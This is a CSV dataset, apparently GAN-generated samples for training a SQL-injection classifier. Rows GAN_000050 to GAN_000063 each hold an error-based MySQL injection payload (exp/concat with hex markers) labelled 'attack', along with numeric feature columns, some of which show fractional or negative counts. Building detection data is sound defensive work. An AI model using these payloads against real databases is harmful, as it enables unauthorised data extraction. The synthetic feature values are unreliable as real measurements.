id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000050,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.7616847512496925,263.66363525390625,73.03767395019531,36.42316436767578,96.47747039794922,6.820831775665283,71.50315856933594,38.913612365722656,1.1798579692840576,0.29384854435920715,0.14952531456947327,0.40192273259162903,0.13069675862789154,3.7153351306915283,1.1788774728775024,0.9822086691856384,0.7575141191482544,0.14171910285949707,0.07936134934425354,0.0012047924101352692,9.29896354675293,9.2923583984375,2.3906474113464355,0.10425917059183121,1.9876412153244019,0.15250997245311737,0.05881687253713608,0.11096230894327164,0.12733228504657745,0.5391930341720581,0.13149689137935638,-0.06634443253278732,1.5321753025054932,0.10203056037425995,0.26740407943725586,2.1547937393188477,7.4139180183410645,0.9117715358734131,1.9113554954528809,0.09934408962726593,0.37692949175834656,0.8731532692909241,0.054744914174079895,0.0673220157623291,-0.027400456368923187,-0.21071460843086243,-0.20115584135055542,0.48946884274482727,0.41913101077079773,0.4098520278930664,0.32289454340934753,0.32654067873954773,-0.21649926900863647,0.18799084424972534,0.17909342050552368,0.06804569065570831,0.05909788981080055,0.15442430973052979,-0.170577734708786,-0.067913718521595,0.0427238866686821,0.10104885697364807,-0.12189248949289322,0.0056358277797698975,0.2593817710876465,-0.08072330802679062,0.568248987197876,0.10827118158340454,0.11047251522541046,0.04990265145897865,0.06471951305866241,-0.2555314004421234,-0.05432824417948723,0.06929869949817657,0.06667786836624146,0.01748577505350113,1.1847574710845947,0.2533564269542694,0.004311554133892059,0.0775514468550682,0.19110070168972015,7.865488052368164,0.7354656457901001,0.1293906718492508,0.003428156254813075,0.6255602836608887,-0.0020996294915676117,-0.12004432827234268,-0.18009091913700104
GAN_000051,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,5.0641433758648,258.31329345703125,75.07865905761719,35.27833938598633,97.7927017211914,-1.5181024074554443,78.45603942871094,46.80538558959961,1.2405033111572266,0.2449125498533249,0.1530504673719406,0.39813849329948425,0.13160471618175507,3.711961269378662,1.622098445892334,1.377160668373108,0.734639585018158,0.1169951856136322,0.0167266596108675,0.17856615781784058,10.70755386352539,8.908246994018555,2.762249708175659,-0.12564685940742493,1.8228498697280884,0.11838334053754807,0.07781568169593811,-0.10648895055055618,-0.04366728290915489,0.7035824060440063,-0.1021682620048523,-0.11201010644435883,1.4306408166885376,0.3004288077354431,0.3777495324611664,2.07456636428833,6.425095558166504,0.5317302942276001,2.078253984451294,0.18823759257793427,0.5717174410820007,1.117557406425476,0.0015537068247795105,0.02279081754386425,0.2794548273086548,0.0035562440752983093,-0.24654027819633484,0.5296793580055237,0.3492850959300995,0.549595057964325,0.09406421333551407,0.4964567720890045,-0.10574258118867874,0.1210210770368576,0.2127974033355713,-0.018495548516511917,0.02951684221625328,-0.1101708859205246,0.2651948034763336,0.1686481237411499,-0.17399103939533234,0.3058188855648041,-0.22982260584831238,0.05978380888700485,0.23544350266456604,-0.028294701129198074,0.5061442255973816,0.351723313331604,0.2159237563610077,-0.12183522433042526,-0.08183002471923828,-0.21582120656967163,0.13798709213733673,0.2403746247291565,0.08483460545539856,0.014679270796477795,1.259027361869812,0.18004362285137177,-0.3501119017601013,-0.08281218260526657,0.21741293370723724,7.523828029632568,1.0043286085128784,0.20505291223526,-0.05983346328139305,0.6058118939399719,0.03373531252145767,0.3244312107563019,0.042925044894218445
GAN_000052,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000092,4.8376281737688975,258.566650390625,72.18911743164062,37.00822830200195,98.45600128173828,0.20190837979316711,75.62788391113281,40.959129333496094,0.8260958194732666,0.27964699268341064,0.15235614776611328,0.39757800102233887,0.12706299126148224,3.7408230304718018,1.3531574010849,1.1546506881713867,0.6837237477302551,0.1089523434638977,0.10731014609336853,-0.06296859681606293,10.130169868469238,10.210062026977539,2.6066486835479736,-0.004289448261260986,1.8274487257003784,0.17656125128269196,0.08924446254968643,0.011801641434431076,0.1325858235359192,0.630547821521759,0.023606691509485245,-0.17812296748161316,1.5186026096343994,0.03175267204642296,0.327138751745224,2.236086130142212,8.034716606140137,1.1015123128890991,2.035897970199585,-0.04580184817314148,0.4951093792915344,0.9579154253005981,-0.06885091215372086,0.04631230980157852,0.09692973643541336,-0.1918061077594757,0.051155686378479004,0.4573219120502472,0.5200672149658203,0.5801401138305664,0.2323315292596817,0.2890077829360962,-0.04324281960725784,0.1499098539352417,0.17098990082740784,0.06858211010694504,0.07579824328422546,0.16737039387226105,-0.08573880046606064,0.3245268762111664,-0.0053471848368644714,0.07790438830852509,-0.12822672724723816,-0.0017046928405761719,0.21978582441806793,-0.07430928200483322,0.49316492676734924,0.21825407445430756,0.05160735547542572,0.07777146995067596,-0.10940283536911011,-0.2262275218963623,0.19698774814605713,-0.01782234013080597,0.054246507585048676,0.0011822041124105453,1.401008129119873,0.3222804367542267,-0.11076506972312927,0.053763896226882935,0.15040171146392822,7.7594146728515625,0.8446072936058044,0.14263109862804413,0.042405419051647186,0.6035757660865784,0.1974647343158722,-0.09247643500566483,0.13699080049991608
GAN_000053,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,5.090541282781471,264.55511474609375,69.17382049560547,31.06536102294922,98.39408111572266,0.981312096118927,80.299072265625,45.35822677612305,0.82377690076828,0.27434733510017395,0.1614212691783905,0.40336576104164124,0.1293317675590515,3.693126678466797,0.8279088139533997,1.1215190887451172,0.5139175653457642,0.13530583679676056,0.07362620532512665,0.21293336153030396,10.321712493896484,8.803860664367676,2.049983501434326,0.16141203045845032,1.8602551221847534,0.18922725319862366,0.0618150532245636,-0.22094520926475525,0.04001612216234207,0.6081362366676331,-0.032962046563625336,-0.08209677040576935,1.1761043071746826,-0.05809350311756134,0.2669028341770172,2.123976707458496,7.757486343383789,0.9048194885253906,2.0648653507232666,0.21248380839824677,0.4324111044406891,1.135440707206726,-0.1755886673927307,0.04894865304231644,0.35986414551734924,-0.5244095325469971,-0.11206726729869843,0.5036526918411255,0.37481704354286194,0.6122862696647644,0.14361430704593658,0.1994541436433792,-0.11871526390314102,0.3873021900653839,0.1788507103919983,-0.053114015609025955,0.007565211970359087,0.025803495198488235,0.26798751950263977,0.2834142744541168,-0.03166830539703369,-0.07890475541353226,-0.3032741844654083,-0.06954774260520935,0.3144128918647766,0.08098605275154114,0.38308075070381165,0.6815341114997864,0.12407434731721878,0.0665801465511322,-0.07537633180618286,-0.09594220668077469,0.1084178015589714,0.09439582377672195,0.10344643145799637,0.003138389904052019,1.454614520072937,0.27465179562568665,-0.2017524093389511,0.02088817209005356,0.3103577792644501,7.584908485412598,1.0053284168243408,0.17179371416568756,-0.019630206748843193,0.5840176343917847,0.22828200459480286,0.07505884766578674,0.01489529013633728
GAN_000054,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,5.192472153611453,276.7939453125,69.80091094970703,36.321990966796875,103.94891357421875,5.1070556640625,83.00794219970703,43.55466842651367,1.0033310651779175,0.26888009905815125,0.13936485350131989,0.39715826511383057,0.1316223442554474,3.742816925048828,1.2117968797683716,1.3097987174987793,0.6648141145706177,0.10298819839954376,0.0694136917591095,-0.04866398870944977,10.85401725769043,9.478943824768066,2.6308600902557373,0.14220388233661652,1.9093915224075317,0.16855528950691223,0.0800519809126854,-0.1871909499168396,0.015287223272025585,0.737240731716156,-0.10477763414382935,-0.17452535033226013,1.428154468536377,0.023279571905732155,0.32267770171165466,2.2142927646636963,7.527688503265381,0.711233913898468,2.0836281776428223,0.0393042266368866,0.6100853681564331,1.140823245048523,-0.04520163685083389,0.023977557197213173,0.30252864956855774,-0.09031522274017334,-0.33446353673934937,0.4892563223838806,0.4847160279750824,0.6264902353286743,0.1622822880744934,0.3682701885700226,-0.17176640033721924,0.2523255944252014,0.24239838123321533,-0.015053976327180862,0.012132562696933746,-0.05342140048742294,0.3036464750766754,0.2444056272506714,0.04086620360612869,0.25019001960754395,-0.1869449019432068,-0.1411454975605011,0.19900614023208618,-0.05028524622321129,0.37846067547798157,0.41235125064849854,0.19149819016456604,0.027055449783802032,-0.280088871717453,-0.0225626640021801,0.12560850381851196,0.09350772202014923,0.08243415504693985,0.009420099668204784,1.2513151168823242,0.23971691727638245,-0.13854368031024933,-0.037307463586330414,0.18896162509918213,8.177573204040527,0.9869502782821655,0.1892106533050537,-0.00992519874125719,0.5603033304214478,0.035295285284519196,0.3685503602027893,0.28650081157684326
GAN_000055,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000092,4.668917176625357,259.8360900878906,70.91806030273438,36.616050720214844,99.66499328613281,6.5096049308776855,75.57769012451172,38.74859619140625,0.9624304175376892,0.2994510233402252,0.1507543921470642,0.39976227283477783,0.132233127951622,3.728233814239502,1.1144217252731323,0.8644407987594604,0.591514527797699,0.1369217038154602,0.07011178135871887,-0.06923205405473709,8.707770347595215,9.863527297973633,2.272695779800415,0.1339215636253357,2.0507473945617676,0.1549999862909317,-0.05215059593319893,0.10120031237602234,0.06478679925203323,0.5292786955833435,0.04620002582669258,-0.1036151573061943,1.4682310819625854,0.013876141980290413,0.3196818232536316,2.215721845626831,7.767459392547607,1.0055381059646606,1.9635584354400635,0.12906262278556824,0.3264070749282837,0.9288647770881653,-0.1529178023338318,0.06021418422460556,0.03001457452774048,-0.14273470640182495,-0.21007415652275085,0.43672457337379456,0.4292587637901306,0.429473876953125,0.32402846217155457,0.28332430124282837,-0.2403792142868042,0.18061195313930511,0.21804006397724152,0.052792988717556,0.0200948566198349,0.056740809231996536,-0.10748858004808426,0.034447602927684784,0.08163856714963913,0.07385186851024628,-0.1263747215270996,0.01795731484889984,0.24837635457515717,-0.058676403015851974,0.5424636602401733,0.2005651742219925,0.03635168820619583,0.044943276792764664,0.08561994135379791,-0.1292746514081955,0.10545997321605682,0.06096510589122772,0.05448068678379059,0.01241227425634861,1.2046737670898438,0.3184022903442383,-0.006583362817764282,0.07923339307308197,0.1933899074792862,8.00425910949707,0.7771348357200623,0.12497222423553467,0.020043229684233665,0.5547269582748413,-0.022703874856233597,-0.08081614971160889,-0.1212967187166214
GAN_000056,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,5.091279733464509,256.51953125,67.60751342773438,32.866275787353516,97.86748504638672,1.9201915264129639,85.80242156982422,48.287845611572266,0.969252347946167,0.24598336219787598,0.16127361357212067,0.3912494480609894,0.13146120309829712,3.744236469268799,1.1646034717559814,0.9139840602874756,0.5063282251358032,0.1395452320575714,0.026405222713947296,0.007342657074332237,11.062641143798828,9.146641731262207,2.025174856185913,-0.00254831463098526,1.7875093221664429,0.1508801281452179,0.06364962458610535,-0.18594986200332642,-0.03959835693240166,0.6675441265106201,-0.027105264365673065,-0.22221092879772186,1.5820187330245972,0.1006557047367096,0.37087562680244446,2.131723165512085,7.849534511566162,0.7421832084655762,2.0102860927581787,0.1467934250831604,0.6152541041374207,1.1580108404159546,0.1043982207775116,0.008519968949258327,0.4296587109565735,-0.21924754977226257,0.026181742548942566,0.35295090079307556,0.49824464321136475,0.6561663150787354,0.015845218673348427,0.2542203366756439,0.17478346824645996,0.08408030867576599,0.15786483883857727,-0.0642826184630394,0.04656536132097244,-0.14035959541797638,0.09946178644895554,0.5119597911834717,-0.1476897895336151,0.03641054034233093,-0.09870564192533493,-0.07881669700145721,0.26822423934936523,0.11292845010757446,0.443451464176178,0.32000672817230225,0.047775231301784515,-0.23798304796218872,-0.2237735390663147,-0.15359431505203247,0.1807146817445755,0.11985725164413452,0.05057692900300026,0.006512358319014311,1.3795006275177002,0.1925303339958191,-0.5143596529960632,0.07155246287584305,0.24432338774204254,8.29245662689209,1.0185034275054932,0.17816002666950226,-0.013713487423956394,0.5620959997177124,0.14798635244369507,0.15385758876800537,0.2348245233297348
GAN_000057,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000092,4.543465479390545,265.69549560546875,72.63736724853516,36.36883544921875,102.52115631103516,1.8752672672271729,75.6004638671875,40.57541275024414,0.9850691556930542,0.2914952039718628,0.1508498191833496,0.3972703814506531,0.1322629749774933,3.7538704872131348,1.4117939472198486,1.0054435729980469,0.6399497985839844,0.10786513239145279,0.05798415094614029,-0.0012606531381607056,9.178741455078125,9.754079818725586,2.7081871032714844,0.07853952050209045,1.947597861289978,0.12733986973762512,-0.031632039695978165,-0.051524896174669266,0.04927944391965866,0.5639472007751465,-0.023637965321540833,-0.09294238686561584,1.5841803550720215,0.09095481783151627,0.3351970613002777,2.0287704467773438,7.568331718444824,0.98354572057724,2.0496087074279785,0.1976858377456665,0.3557007610797882,0.9237625598907471,-0.04481209069490433,0.05382514372467995,0.05784393101930618,-0.10538151860237122,-0.08543513715267181,0.40133553743362427,0.4285008907318115,0.4619581997394562,0.2271346002817154,0.32944637537002563,-0.05351568013429642,-0.01004931703209877,0.1456129103899002,0.04617759585380554,0.055815380066633224,0.05855564400553703,0.024293608963489532,0.15580150485038757,-0.1074272096157074,0.011211790144443512,-0.040512897074222565,-0.046572744846343994,0.20304732024669647,-0.09782592952251434,0.513507604598999,0.1611340194940567,0.05117620527744293,0.07809537649154663,-0.012117274105548859,-0.1031438335776329,0.1327139139175415,0.12084820866584778,0.057930052280426025,0.009531345218420029,1.2786295413970947,0.3432418406009674,-0.06431220471858978,0.07986794412136078,0.20221777260303497,8.016165733337402,0.8395259976387024,0.12874634563922882,0.013324960134923458,0.5870975255966187,0.10870334506034851,-0.011281095445156097,-0.0025743991136550903
GAN_000058,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.7565628663121124,258.23260498046875,75.08753204345703,36.60524368286133,103.43928527832031,6.217189788818359,76.22063446044922,42.41770553588867,1.1877371072769165,0.26835203170776367,0.14736393094062805,0.39296865463256836,0.12952138483524323,3.7264978885650635,1.3029536008834839,0.9694527983665466,0.750521183013916,0.08793776482343674,0.05108606070280075,0.059697359800338745,10.096436500549316,9.6046724319458,3.0239007472991943,0.0983014851808548,1.8769054412841797,0.1430595964193344,0.064051054418087,0.02602149173617363,0.02200157754123211,0.6095151901245117,-0.09690643846988678,-0.04569682478904724,1.4369081258773804,0.22305437922477722,0.35647720098495483,2.102659225463867,7.05952787399292,0.6452337503433228,1.8204944133758545,0.07361549139022827,0.5168615579605103,1.0908926725387573,-0.03838648647069931,0.007847256027162075,0.1426577866077423,-0.04376249015331268,-0.2734593451023102,0.4368431866168976,0.47764161229133606,0.4915347993373871,0.10696519166231155,0.35549095273017883,-0.12371812015771866,0.0740458220243454,0.22284336388111115,0.023841220885515213,0.041872669011354446,-0.0075726937502622604,0.18283897638320923,0.11954057216644287,-0.02284315973520279,0.27969691157341003,-0.01297537237405777,-0.13599804043769836,0.19348548352718353,0.015981610864400864,0.4764500558376312,0.05480551719665527,0.19030186533927917,-0.057824812829494476,-0.1782820224761963,-0.2326633185148239,-0.01854197308421135,0.03607390820980072,0.051093313843011856,0.011803136207163334,1.3344404697418213,0.27825483679771423,-0.1169918030500412,-0.028613276779651642,0.1632925122976303,7.79835319519043,0.906671404838562,0.18861673772335052,-0.03824584558606148,0.5333569049835205,-0.07730838656425476,0.224105566740036,0.07722146809101105
GAN_000059,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000092,4.567467314769573,258.6735534667969,72.80349731445312,37.09596633911133,98.35443115234375,5.8167805671691895,73.24512481689453,38.204044342041016,0.98814857006073,0.30238866806030273,0.1551966667175293,0.39380764961242676,0.132136270403862,3.7499895095825195,1.290235996246338,0.6660600900650024,0.5292214155197144,0.12273288518190384,0.04455577954649925,0.07375882565975189,8.576394081115723,9.531862258911133,2.5990045070648193,0.10242079198360443,1.9909086227416992,0.13306471705436707,-0.13766323029994965,0.13890580832958221,0.055776242166757584,0.513690173625946,0.04818655177950859,-0.2262980341911316,1.5676931142807007,0.01190006174147129,0.2611317038536072,2.156324625015259,7.923858642578125,1.0074341297149658,1.872462511062622,0.1443289816379547,0.3326893746852875,0.893963634967804,0.038847118616104126,0.048723816871643066,0.03649459034204483,-0.08854503929615021,-0.09663274884223938,0.4339843690395355,0.3981437683105469,0.41528940200805664,0.36368799209594727,0.3034707009792328,-0.11041270941495895,0.05186641961336136,0.21065863966941833,0.05573253706097603,0.033623646944761276,0.09540292620658875,-0.07796144485473633,0.14678451418876648,-0.0755537897348404,-0.08003504574298859,-0.04585065692663193,0.15758416056632996,0.19393086433410645,0.002755645662546158,0.5210860371589661,0.08389124274253845,0.0936405286192894,0.05123504251241684,0.07720202207565308,-0.09107093513011932,0.07349817454814911,0.03690887987613678,0.04677142575383186,0.012580735608935356,1.2008483409881592,0.36148393154144287,-0.05282573401927948,0.1317768543958664,0.25757166743278503,8.174640655517578,0.7708456516265869,0.15230996906757355,0.041890550404787064,0.5598099231719971,-0.05539385601878166,-0.1576632261276245,-0.12149706482887268
GAN_000060,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,5.029272562050682,250.6999053955078,70.08519744873047,36.48945617675781,101.12677001953125,2.3027455806732178,83.72343444824219,48.70260238647461,1.4156692028045654,0.2290567010641098,0.15047428011894226,0.3953395485877991,0.12861929833889008,3.674175500869751,1.3509126901626587,1.2328437566757202,0.7462116479873657,0.1845172643661499,0.02641570195555687,0.05159661918878555,10.518936157226562,9.070859909057617,2.6577956676483154,0.02829252928495407,1.8833860158920288,0.12917600572109222,-0.010363935492932796,-0.12025449424982071,-0.03662289306521416,0.7264150381088257,0.009721610695123672,-0.02735171467065811,1.4173425436019897,0.42489516735076904,0.4099016785621643,2.2362425327301025,6.451808452606201,0.24878929555416107,1.767876148223877,0.15247298777103424,0.6119175553321838,1.2227040529251099,-0.08333618193864822,-0.008635849691927433,0.31170639395713806,0.0036811232566833496,-0.3665046691894531,0.41633060574531555,0.4671560227870941,0.5562366247177124,-0.09884577244520187,0.3620564639568329,-0.1877211034297943,0.09385725855827332,0.21295811235904694,-0.014072608202695847,0.021109402179718018,0.057573165744543076,0.27184808254241943,0.10884624719619751,-0.03908732533454895,0.5537809729576111,-0.01884029060602188,-0.0965835303068161,0.2188444584608078,-0.007307033985853195,0.5445641279220581,0.15518413484096527,0.206878662109375,-0.22846537828445435,-0.19075322151184082,-0.1615622341632843,0.07178708165884018,0.3154154419898987,0.06496164202690125,0.02238684706389904,1.445846676826477,0.19777001440525055,-0.3120723366737366,-0.07585141807794571,0.11290735751390457,8.034300804138184,0.9886314868927002,0.24255840480327606,-0.0857585221529007,0.5077487826347351,-0.09502176940441132,0.5177446007728577,0.008240856230258942
GAN_000061,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000177,4.733040253975923,259.99627685546875,69.87763214111328,37.00323486328125,103.77301788330078,0.4988091289997101,79.56562042236328,43.424861907958984,1.2060495615005493,0.2654046416282654,0.16085027158260345,0.4000639319419861,0.1315000057220459,3.680643320083618,1.2424033880233765,1.1662819385528564,0.7388197779655457,0.15958453714847565,0.04468941316008568,0.232235848903656,9.43596363067627,9.593307495117188,2.6054558753967285,0.036950357258319855,1.8599014282226562,0.15367846190929413,-0.1193201094865799,-0.044277433305978775,0.028230445459485054,0.5519115924835205,-0.03654064983129501,-0.08042691648006439,1.4658869504928589,0.15062740445137024,0.3101173937320709,2.1006176471710205,7.1545867919921875,0.7057942748069763,1.851945161819458,0.18940576910972595,0.37109899520874023,0.9767734408378601,-0.15842744708061218,0.04199950397014618,0.23240643739700317,-0.15509521961212158,-0.15949121117591858,0.5137022733688354,0.44145724177360535,0.4676003158092499,0.13415847718715668,0.27901405096054077,-0.1109810546040535,0.09804333746433258,0.1470687985420227,0.023944739252328873,0.07089132070541382,0.1844586730003357,0.04519066959619522,0.060696136206388474,-0.01008092612028122,0.028892882168293,-0.1865673065185547,-0.034618936479091644,0.2726706266403198,-0.01353464275598526,0.5139130353927612,0.22285424172878265,0.13467200100421906,0.04986416548490524,-0.061793938279151917,-0.21640272438526154,-0.08081167936325073,0.14245055615901947,0.08742670714855194,0.014740964397788048,1.4081796407699585,0.2904902696609497,-0.10114230215549469,0.038116827607154846,0.22270609438419342,7.393150806427002,0.8803133964538574,0.19306519627571106,-0.05306151136755943,0.5668374300003052,0.022238951176404953,0.06721989810466766,-0.22348979115486145
GAN_000062,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000092,4.758551470412259,257.5875549316406,71.86273956298828,35.900047302246094,103.41129302978516,5.618330478668213,80.47946166992188,40.27219772338867,0.9032398462295532,0.28068608045578003,0.14577960968017578,0.3963298499584198,0.1282704770565033,3.7496109008789062,1.189840316772461,0.9532367587089539,0.6007633805274963,0.07601232081651688,0.054115284234285355,-0.07002125680446625,9.089272499084473,10.217684745788574,2.4558722972869873,0.1520630121231079,1.9420592784881592,0.13011980056762695,-0.08439706265926361,-0.04335034266114235,0.02895546518266201,0.5213251709938049,0.009683307260274887,-0.04190913587808609,1.441637396812439,0.017480986192822456,0.36736467480659485,2.051020383834839,7.274966239929199,0.9754284620285034,1.8482484817504883,0.1308642327785492,0.4149671792984009,1.0223888158798218,-0.2519218325614929,0.04306124895811081,0.029277563095092773,-0.06888149678707123,-0.17974282801151276,0.438467413187027,0.43556347489356995,0.49706438183784485,0.2521953284740448,0.327499121427536,-0.1820921003818512,0.14421944320201874,0.23274123668670654,0.054489463567733765,0.007597215939313173,0.04719092324376106,0.1542634665966034,0.18711623549461365,-0.03729284554719925,0.25726622343063354,-0.06121367961168289,-0.0667022243142128,0.2141074240207672,-0.036831311881542206,0.43226510286331177,0.20595385134220123,0.12574738264083862,-0.009587816894054413,-0.07818952202796936,-0.07024019956588745,0.20893031358718872,0.10516403615474701,0.0425214059650898,0.00465393578633666,1.2773149013519287,0.33033379912376404,0.014226801693439484,-0.01668093353509903,0.1711215227842331,7.578506946563721,0.9018470644950867,0.16432839632034302,-0.004531488753855228,0.5155467987060547,0.09609788656234741,0.07466476410627365,0.18405304849147797
GAN_000063,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000092,4.638091077199931,256.7281799316406,75.23139953613281,37.30990982055664,97.42323303222656,5.550654411315918,72.91213989257812,40.319847106933594,1.2622328996658325,0.2894481122493744,0.14942248165607452,0.39516088366508484,0.13136620819568634,3.7158548831939697,1.3707937002182007,0.7727543711662292,0.6577270030975342,0.1253272145986557,0.03886549919843674,-0.005327017977833748,9.513679504394531,9.290538787841797,2.6308493614196777,0.14193877577781677,1.9546420574188232,0.1337919384241104,0.09384576976299286,0.12976400554180145,0.03858140483498573,0.5307071208953857,0.01729048416018486,-0.0752546638250351,1.5703226327896118,0.22887811064720154,0.3111669719219208,2.17987060546875,7.330201625823975,0.7889160513877869,1.952560544013977,0.14823657274246216,0.45079174637794495,0.9520076513290405,0.14345711469650269,0.029918285086750984,0.12429607659578323,-0.0842742770910263,-0.1913011521100998,0.40528038144111633,0.40505141019821167,0.42049410939216614,0.22339802980422974,0.3413877487182617,-0.1678379774093628,0.08605755865573883,0.2221069633960724,0.03726428374648094,0.07526803016662598,-0.0021441075950860977,-0.05181492120027542,0.16760537028312683,-0.0742001011967659,0.09294812381267548,-0.003949694335460663,-0.07175660133361816,0.24589769542217255,0.059192392975091934,0.5713545083999634,0.021391883492469788,0.05846178159117699,-0.11075160652399063,-0.0028060898184776306,-0.27360597252845764,-0.08081819117069244,0.04362335801124573,0.04733305424451828,0.01681510917842388,1.185473918914795,0.3119269013404846,-0.0778278112411499,0.06859149038791656,0.17099128663539886,8.144107818603516,0.783186137676239,0.15259526669979095,-0.003469349117949605,0.5707312226295471,-0.14898976683616638,-0.03663147613406181,-0.029792658984661102
